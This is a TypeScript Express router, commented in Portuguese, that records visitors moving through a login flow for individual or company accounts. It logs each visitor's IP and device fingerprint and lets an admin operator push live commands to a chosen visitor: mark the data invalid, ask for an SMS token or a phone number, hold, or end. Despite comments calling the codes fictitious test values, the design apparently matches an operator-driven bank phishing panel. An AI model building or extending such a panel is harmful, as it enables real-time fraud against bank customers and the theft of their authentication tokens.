import { Router, type IRouter, type Request, type Response, type NextFunction } from "express";
import { desc, eq, sql } from "drizzle-orm";
import jwt from "jsonwebtoken";
import {
  db,
  loginSessionsTable,
  type LoginSessionRow,
  type SessionHistoryEntry,
  type SessionStep,
} from "@workspace/db";

const router: IRouter = Router();

function requireAdmin(req: Request, res: Response, next: NextFunction): void {
  const header = req.headers.authorization ?? "";
  const secret = process.env.ADMIN_JWT_SECRET;
  if (header.startsWith("Bearer ") && secret) {
    try {
      const d = jwt.verify(header.slice(7), secret);
      if (typeof d === "object" && (d as { role?: string }).role === "admin") return next();
    } catch {
      /* invalid */
    }
  }
  res.status(401).json({ message: "Não autenticado." });
}

function parseUA(ua: string) {
  const browser = /Edg/.test(ua) ? "Edge" : /OPR|Opera/.test(ua) ? "Opera"
    : /Firefox/.test(ua) ? "Firefox" : /Chrome/.test(ua) ? "Chrome"
    : /Safari/.test(ua) ? "Safari" : "Outro";
  const os = /Windows/.test(ua) ? "Windows" : /Android/.test(ua) ? "Android"
    : /iPhone|iPad|iOS/.test(ua) ? "iOS" : /Mac OS X|Macintosh/.test(ua) ? "macOS"
    : /Linux/.test(ua) ? "Linux" : "-";
  const deviceType = /iPad|Tablet/.test(ua) ? "Tablet"
    : /Mobile|Android|iPhone/.test(ua) ? "Mobile" : "Desktop";
  return { browser, os, deviceType };
}

function clientIp(req: Request): string {
  const fwd = (req.headers["x-forwarded-for"] as string | undefined) ?? "";
  const ip = fwd.split(",")[0]?.trim() || req.socket.remoteAddress || "";
  return ip.replace(/^::ffff:/, "");
}

const str = (v: unknown, max: number) => (typeof v === "string" ? v.slice(0, max) : null);

/** Descarta registros de teste/mock (rota ou identificador iniciando com TEST_ ). */
const isTest = (v: string | null | undefined) =>
  !!v && (v.startsWith("TEST_") || v.startsWith("/TEST_"));

/** Só exclui do listing do painel dados de teste. */
const notTestFilter = sql`left(${loginSessionsTable.currentStep}, 5) <> 'TEST_'
  AND left(coalesce(${loginSessionsTable.currentStep}, ''), 6) <> '/TEST_'
  AND left(coalesce(${loginSessionsTable.identifier}, ''), 5) <> 'TEST_'`;

const VALID_COMMANDS: Record<string, { directive: string; status?: string; label: string }> = {
  invalid: { directive: "invalid", label: "Comando: Dados inválidos" },
  sms_token: { directive: "sms_token", label: "Comando: Token SMS" },
  ask_phone: { directive: "ask_phone", label: "Comando: Pedir telefone" },
  hold: { directive: "hold", label: "Comando: Colocar em aguarde" },
  end: { directive: "ended", status: "ended", label: "Comando: Encerrar sessão" },
};

/** Gera um código de homologação fictício (4 caracteres, A-Z e 0-9). */
function genTestCode(): string {
  const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  let s = "";
  for (let i = 0; i < 4; i++) s += alphabet[Math.floor(Math.random() * alphabet.length)];
  return s;
}

/**
 * Público: registra/atualiza a sessão única do visitante conforme ele avança
 * no fluxo. NUNCA recebe senha/OTP. `respondTo` indica que o cliente respondeu
 * a um comando do operador (ex.: informou o token SMS), sem enviar o valor.
 */
router.post("/auth-attempt", async (req, res) => {
  const b = req.body ?? {};
  const sessionId = str(b.sessionId, 80);
  if (!sessionId) {
    res.status(400).json({ message: "sessionId ausente." });
    return;
  }
  const route = str(b.route, 300) ?? "/";
  const label = str(b.label, 160);
  if (isTest(route) || isTest(label)) {
    res.json({ ok: true, ignored: true });
    return;
  }
  const respondTo = str(b.respondTo, 120);
  const flowType = b.flowType === "PF" || b.flowType === "PJ" ? b.flowType : null;
  const ua = (typeof b.userAgent === "string" && b.userAgent) || req.headers["user-agent"] || "";
  const { browser, os, deviceType } = parseUA(String(ua));
  const ip = clientIp(req);
  const isPrivate = /^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|127\.|::1)/.test(ip);
  const now = new Date().toISOString();

  const existing = (
    await db.select().from(loginSessionsTable).where(eq(loginSessionsTable.sessionId, sessionId)).limit(1)
  )[0];

  const step: SessionStep = { route, label, at: now };

  if (!existing) {
    const history: SessionHistoryEntry[] = [
      { type: "step", label: `Início do fluxo (${flowType ?? "?"}) — ${route}`, at: now },
    ];
    await db.insert(loginSessionsTable).values({
      sessionId,
      flowType,
      identifier: label,
      currentStep: route,
      status: "active",
      directive: "none",
      steps: [step],
      history,
      ip,
      browser,
      os,
      deviceType,
      language: str(b.language, 40),
      timezone: str(b.timezone, 60),
      screen: str(b.screen, 30),
      referrer: str(b.referrer, 300),
      userAgent: String(ua).slice(0, 500),
      location: isPrivate ? "Local" : "Internet",
      updatedAt: new Date(),
    });
    res.json({ ok: true });
    return;
  }

  if (existing.status === "ended") {
    res.json({ ok: true, ended: true });
    return;
  }

  const steps = [...(existing.steps ?? []), step];
  const history = [...(existing.history ?? [])];
  let directive = existing.directive;

  if (respondTo) {
    // Cliente respondeu a um comando: volta ao estado de espera e registra.
    history.push({ type: "client", label: `Cliente respondeu: ${respondTo}`, at: now });
    directive = "hold";
  } else {
    // Avanço normal no fluxo: qualquer comando pendente fica obsoleto.
    history.push({ type: "step", label: `Etapa: ${route}${label ? ` — ${label}` : ""}`, at: now });
    directive = "none";
  }

  await db
    .update(loginSessionsTable)
    .set({
      flowType: flowType ?? existing.flowType,
      identifier: label ?? existing.identifier,
      currentStep: route,
      directive,
      steps,
      history,
      updatedAt: new Date(),
    })
    .where(eq(loginSessionsTable.id, existing.id));

  res.json({ ok: true });
});

/** Público: consulta a diretiva atual da sessão para orientar a interface. */
router.get("/auth-attempt/directive", async (req, res) => {
  const sessionId = typeof req.query.sessionId === "string" ? req.query.sessionId : "";
  if (!sessionId) {
    res.json({ directive: "none", status: "active" });
    return;
  }
  const row = (
    await db
      .select({ directive: loginSessionsTable.directive, status: loginSessionsTable.status, smsLast3: loginSessionsTable.smsLast3 })
      .from(loginSessionsTable)
      .where(eq(loginSessionsTable.sessionId, sessionId))
      .limit(1)
  )[0];
  res.json({ directive: row?.directive ?? "none", status: row?.status ?? "active", smsLast3: row?.smsLast3 ?? null });
});

const toClient = (r: LoginSessionRow) => ({
  id: r.id,
  sessionId: r.sessionId,
  flowType: r.flowType,
  identifier: r.identifier,
  currentStep: r.currentStep,
  status: r.status,
  directive: r.directive,
  smsLast3: r.smsLast3,
  smsTestCode: r.smsTestCode,
  steps: r.steps ?? [],
  history: r.history ?? [],
  ip: r.ip,
  browser: r.browser,
  deviceType: r.deviceType,
  os: r.os,
  language: r.language,
  timezone: r.timezone,
  screen: r.screen,
  referrer: r.referrer,
  userAgent: r.userAgent,
  location: r.location,
  createdAt: r.createdAt instanceof Date ? r.createdAt.toISOString() : String(r.createdAt),
  updatedAt: r.updatedAt instanceof Date ? r.updatedAt.toISOString() : String(r.updatedAt),
});

/** Admin: lista de sessões (exclui dados de teste/mock). */
router.get("/auth-attempt/list", requireAdmin, async (_req, res) => {
  const rows = await db
    .select()
    .from(loginSessionsTable)
    .where(notTestFilter)
    .orderBy(desc(loginSessionsTable.updatedAt))
    .limit(500);
  res.json({ items: rows.map(toClient) });
});

/** Admin: aplica um comando a UMA sessão específica. */
router.post("/auth-attempt/command", requireAdmin, async (req, res) => {
  const id = str(req.body?.id, 80);
  const command = str(req.body?.command, 40);
  if (!id || !command || !VALID_COMMANDS[command]) {
    res.status(400).json({ message: "Comando inválido." });
    return;
  }
  const spec = VALID_COMMANDS[command];
  const existing = (
    await db.select().from(loginSessionsTable).where(eq(loginSessionsTable.id, id)).limit(1)
  )[0];
  if (!existing) {
    res.status(404).json({ message: "Sessão não encontrada." });
    return;
  }
  const now = new Date().toISOString();
  const updates: Record<string, unknown> = {
    directive: spec.directive,
    status: spec.status ?? existing.status,
    updatedAt: new Date(),
  };
  let label = spec.label;
  let testCode: string | undefined;

  if (command === "sms_token") {
    // Homologação: gera código fictício e guarda os 3 dígitos finais informados
    // pelo operador. NUNCA há código real de autenticação aqui.
    const last3 = (str(req.body?.last3, 6) ?? "").replace(/\D/g, "").slice(0, 3);
    testCode = genTestCode();
    updates.smsLast3 = last3 || null;
    updates.smsTestCode = testCode;
    label = `Comando: Token SMS (nº •••${last3 || "???"})`;
  }

  const history = [...(existing.history ?? []), { type: "command", label, at: now }];
  updates.history = history;

  await db.update(loginSessionsTable).set(updates).where(eq(loginSessionsTable.id, id));
  res.json({ ok: true, testCode });
});

/**
 * Público (PJ): valida o código de liberação de HOMOLOGAÇÃO digitado pelo cliente
 * contra o código fictício gerado pelo sistema. NÃO armazena nem retorna o valor
 * digitado; ao validar, registra apenas "Código de teste informado: ****" e o
 * horário, e coloca a sessão em espera (hold) para o próximo comando do operador.
 */
router.post("/auth-attempt/sms-verify", async (req, res) => {
  const sessionId = str(req.body?.sessionId, 80);
  const code = (str(req.body?.code, 8) ?? "").toUpperCase().replace(/[^A-Z0-9]/g, "").slice(0, 4);
  if (!sessionId || code.length !== 4) {
    res.json({ valid: false });
    return;
  }
  const existing = (
    await db.select().from(loginSessionsTable).where(eq(loginSessionsTable.sessionId, sessionId)).limit(1)
  )[0];
  if (
    !existing ||
    existing.status === "ended" ||
    existing.directive !== "sms_token" ||
    !existing.smsTestCode ||
    code !== existing.smsTestCode
  ) {
    res.json({ valid: false });
    return;
  }
  const now = new Date().toISOString();
  const history = [
    ...(existing.history ?? []),
    { type: "client", label: "Código de teste informado: ****", at: now },
  ];
  await db
    .update(loginSessionsTable)
    .set({ directive: "hold", history, updatedAt: new Date() })
    .where(eq(loginSessionsTable.id, existing.id));
  res.json({ valid: true });
});

export default router;
